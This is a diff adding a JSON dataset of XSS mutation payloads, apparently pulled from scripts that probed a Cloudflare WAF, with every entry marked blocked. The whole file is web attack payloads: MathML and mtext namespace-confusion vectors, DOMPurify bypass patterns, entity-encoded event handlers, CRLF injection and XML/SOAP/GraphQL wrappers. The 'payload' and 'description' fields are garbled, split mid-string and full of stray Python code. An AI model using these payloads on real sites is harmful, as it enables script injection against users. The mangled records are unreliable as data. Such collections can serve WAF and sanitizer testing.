@@ -1,0 +1,63 @@
+{
+  "category": "xss",
+  "subcategory": "mutation",
+  "count": 4,
+  "payloads": [
+    {
+      "id": "xss-0044",
+      "category": "xss",
+      "subcategory": "mutation",
+      "payload": "\n\" + \"=\" * 70)\nprint(\"7C: MathML HTML Integration — mtext/annotation-xml\")\nprint(\"=\" * 70 + \"\n\")\n\n# The key trick: <mtext> inside <math> re-enters the HTML parser\n# This means HTML tags inside <mtext> are parsed as HTML, not MathML\nmath_html = {\n    # mtext with HTML inside\n    \"mtext-img\": '<math><mtext><img src=x onerror=alert(1)></mtext></math>",
+      "description": "mtext-svg\": '<math><mtext><svg onload=alert(1)></svg></mtext></math>',\n    \"mtext-div\": '<math><mtext><div onclick=alert(1)>x</div></mtext></math>',\n    \"mtext-input\": '<math><mtext><input onfocus=alert(1) autofocus></mtext></math>',\n    \"mtext-a\": '<math><mtext><a href=javascript:alert(1)>x</a></mtext></math>',\n    \"mtext-details\": '<math><mtext><details open ontoggle=alert(1)></mtext></math>',\n\n    # annotation-xml with encoding=\"text/html\"\n    \"annxml-img\": '<math><annotation-xml encoding=\"text/html\"><img src=x onerror=alert(1)></annotation-xml></math>',\n    \"annxml-svg\": '<math><annotation-xml encoding=\"text/html\"><svg onload=alert(1)></annotation-xml></math>',\n    \"annxml-div\": '<math><annotation-xml encoding=\"text/html\"><div onclick=alert(1)>x</div></annotation-xml></math>',\n\n    # annotation-xml with different encodings\n    \"annxml-xhtml\": '<math><annotation-xml encoding=\"application/xhtml+xml\"><img src=x onerror=alert(1)></annotation-xml></math>',\n\n    # mtext with table (classic mXSS vector)\n    \"mtext-table\": '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)></mtext></math>',\n    \"mtext-table2\": '<math><mtext><table><img src=x onerror=alert(1)></table></mtext></math>',\n    \"mtext-table-tr\": '<math><mtext><table><tr><td><img src=x onerror=alert(1)></table></mtext></math>',\n\n    # mglyph with event (mglyph is special in MathML)\n    \"mglyph-onerror\": '<math><mglyph src=x onerror=alert(1)>',\n    \"mglyph-onclick\": '<math><mglyph onclick=alert(1)>',\n\n    # merror with HTML\n    \"merror-img\": '<math><merror><img src=x onerror=alert(1)></merror></math>',\n    \"merror-svg\": '<math><merror><svg onload=alert(1)></merror></math>',\n\n    # mphantom with HTML\n    \"mphantom-img\": '<math><mphantom><img src=x onerror=alert(1)></mphantom></math>',\n\n    # Nested math + SVG\n    \"math-svg-nest\": '<math><svg onload=alert(1)></svg></math>',\n    \"math-foreignObject\": '<math><mtext><svg><foreignObject><div onclick=alert(1)>x</div></foreignObject></svg></mtext></math>',\n}\n\nfor name, payload in math_html.items():\n    test(name, \"globalHtml\", payload)\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 70)\nprint(\"7D: MathML with Known Bypass Patterns",
+      "technique": "direct_injection",
+      "source_file": "waf_round7_math.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0159",
+      "category": "xss",
+      "subcategory": "mutation",
+      "payload": "YWxlcnQoMSk=\"))>',\n\n    # HTML entity in event handler\n    \"entity-paren\": \"<img src=x onerror=alert&lpar;1&rpar;>",
+      "description": "entity-paren2\": \"<img src=x onerror=alert&#40;1&#41;>\",\n    \"entity-paren-hex\": \"<img src=x onerror=alert&#x28;1&#x29;>\",\n\n    # Encoded event handlers\n    \"encoded-onerror\": \"<img src=x on&#x65;rror=alert(1)>\",\n    \"encoded-onerror2\": \"<img src=x on\\u0065rror=alert(1)>\",\n\n    # Style-based\n    \"style-expression\": '<div style=\"width: expression(alert(1))\">',\n    \"style-url-js\": '<div style=\"background:url(javascript:alert(1))\">',\n\n    # IE-specific\n    \"img-dynsrc\": \"<img dynsrc=javascript:alert(1)>\",\n    \"img-lowsrc\": \"<img lowsrc=javascript:alert(1)>\",\n\n    # Object/Embed\n    \"object-data\": '<object data=\"javascript:alert(1)\">',\n    \"embed-src\": '<embed src=\"javascript:alert(1)\">',\n\n    # Form action\n    \"form-action\": '<form><button formaction=\"javascript:alert(1)\">click</button></form>',\n\n    # Mutation XSS vectors\n    \"mxss-noscript\": '<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">',\n    \"mxss-style\": '<style><img src=\"</style><img src=x onerror=alert(1)//\">',\n    \"mxss-select\": '<select><template><img src=x onerror=alert(1)></template></select>',\n\n    # Encoding bypass — payload in POST body via GET param\n    \"crlf-inject\": \"x%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>\",\n\n    # Unicode normalization attacks\n    \"nfkc-script\": \"<\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074>alert(1)</script>\",\n    \"nfkc-img\": \"<\\u0069\\u006d\\u0067 src=x onerror=alert(1)>\",\n\n    # Less common tags with events\n    \"marquee-start\": \"<marquee onstart=alert(1)>\",\n    \"video-source\": \"<video><source onerror=alert(1)>\",\n    \"audio-source\": \"<audio><source onerror=alert(1)>\",\n    \"details-toggle\": \"<details open ontoggle=alert(1)>\",\n\n    # Base tag hijack\n    \"base-href\": '<base href=\"javascript://\"><a href=\"/../alert(1)\">click</a>',\n\n    # Template/shadowDOM\n    \"template-shadow\": '<div><template shadowrootmode=open><img src=x onerror=alert(1)></template></div>',\n\n    # Content after null byte\n    \"null-after\": \"benign\\x00<script>alert(1)</script>\",\n\n    # Very long padding before payload\n    \"long-padding\": \"A\" * 4000 + \"<img src=x onerror=alert(1)>\",\n\n    # Payload in different param position (test WAF param parsing)\n    \"multiline-payload\": \"x\\n<img src=x onerror=alert(1)>\",\n    \"tab-payload\": \"x\\t<img src=x onerror=alert(1)>\",\n\n    # Constructor without dots\n    \"constructor-brackets\": '<img src=x onerror=self[\"alert",
+      "technique": "encoding",
+      "source_file": "waf_advanced.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0293",
+      "category": "xss",
+      "subcategory": "mutation",
+      "payload": "\n--- E: mXSS (Mutation XSS) ---\")\n\n# mXSS: payloads that are safe when parsed as HTML, but become\n# dangerous after innerHTML round-trip mutation\n\nMXSS_PAYLOADS = [\n    # Classic mXSS: backtick in attribute\n    '<img src=\"``onerror=alert(1)\">",
+      "description": "<img src=`x`onerror=alert(1)>',\n    # Namespace confusion\n    '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',\n    '<svg><style><img/src=x onerror=alert(1)//>',\n    '<math><mtext><img src=x onerror=alert(1)>',\n    # DOMPurify bypass patterns\n    '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',\n    '<svg></p><style><a id=\"</style><img src=x onerror=alert(1)>\">',\n    # noscript mutation\n    '<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">',\n    # Template\n    '<template><img src=x onerror=alert(1)></template>',\n    # Select/option mutation\n    '<select><template><img src=x onerror=alert(1)></template></select>',\n    # Custom element mutation\n    '<xss-elem><img src=x onerror=alert(1)></xss-elem>',\n    # Table context mutation\n    '<table><tr><td><img src=x onerror=alert(1)></td></tr></table>',\n    # Frameset mutation\n    '<frameset><frame src=\"javascript:alert(1)\">',\n    # Object/embed\n    '<object data=\"javascript:alert(1)\">',\n    '<embed src=\"javascript:alert(1)\">',\n    # Details/summary\n    '<details open><summary>X</summary><img src=x onerror=alert(1)></details>',\n    # SVG foreignObject\n    '<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>',\n    # SVG desc\n    '<svg><desc><img src=x onerror=alert(1)></desc></svg>',\n    # SVG title\n    '<svg><title><img src=x onerror=alert(1)></title></svg>',\n    # MathML annotation-xml\n    '<math><annotation-xml encoding=\"text/html\"><img src=x onerror=alert(1)></annotation-xml></math>',\n]\n\nfor p in MXSS_PAYLOADS:\n    get(p, label=\"mxss",
+      "technique": "mutation",
+      "source_file": "waf_round92_research2.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0431",
+      "category": "xss",
+      "subcategory": "mutation",
+      "payload": "utf-8', errors='replace'))\n    # In header\n    raw_req(f\"GET / HTTP/1.1\r\nHost: {HOST}\r\nX-Custom: {crlf}\r\nConnection: close\r\n\r\n\".encode('utf-8', errors='replace'))\n\nprint(f\"  CRLF done: {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- E: XML/SOAP/GraphQL with XSS ---\")\n\nXML_PAYLOADS = [\n    # XML body\n    '<?xml version=\"1.0\"?><root><globalHtml><![CDATA[<script>alert(1)</script>]]></globalHtml></root>",
+      "description": "<?xml version=\"1.0\"?><root><globalHtml>&lt;script&gt;alert(1)&lt;/script&gt;</globalHtml></root>',\n    '<?xml version=\"1.0\"?><root><globalHtml><svg onload=\"alert(1)\"/></globalHtml></root>',\n    # SOAP\n    '<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><globalHtml><script>alert(1)</script></globalHtml></soap:Body></soap:Envelope>',\n    # GraphQL\n    '{\"query\":\"mutation{setHtml(input:\\\\\"<svg/onload=alert(1)>\\\\",
+      "technique": "mutation",
+      "source_file": "waf_round80_final.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
